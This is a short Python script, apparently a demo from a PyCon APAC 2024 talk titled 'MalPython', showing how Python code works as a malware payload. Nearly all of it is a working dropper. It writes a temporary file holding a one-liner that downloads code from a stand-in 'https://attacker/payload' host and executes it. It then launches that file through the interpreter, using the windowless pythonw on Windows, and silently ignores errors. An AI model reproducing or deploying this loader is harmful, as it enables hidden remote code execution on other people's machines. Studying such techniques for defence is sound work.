# MalPython
# PyCon APAC 2024
#
# Example of Python code as payload
# Download / read python code from remote host and execute it

from tempfile import NamedTemporaryFile as _f 
from sys import executable as _e 
from os import system as _s 

_t = _f(delete=False)
_t.write(b"""from urllib.request import urlopen as _u;exec(_u('https://attacker/payload').read())""")
_t.close()

# guess the platform and run it accordingly

try:
    import platform
    if platform.system() == "Windows":
        _s(f"start {_e.replace('.exe','w.exe')} {_t.name}")
    else:
        _s(f"{_e} {_t.name}")
except: pass 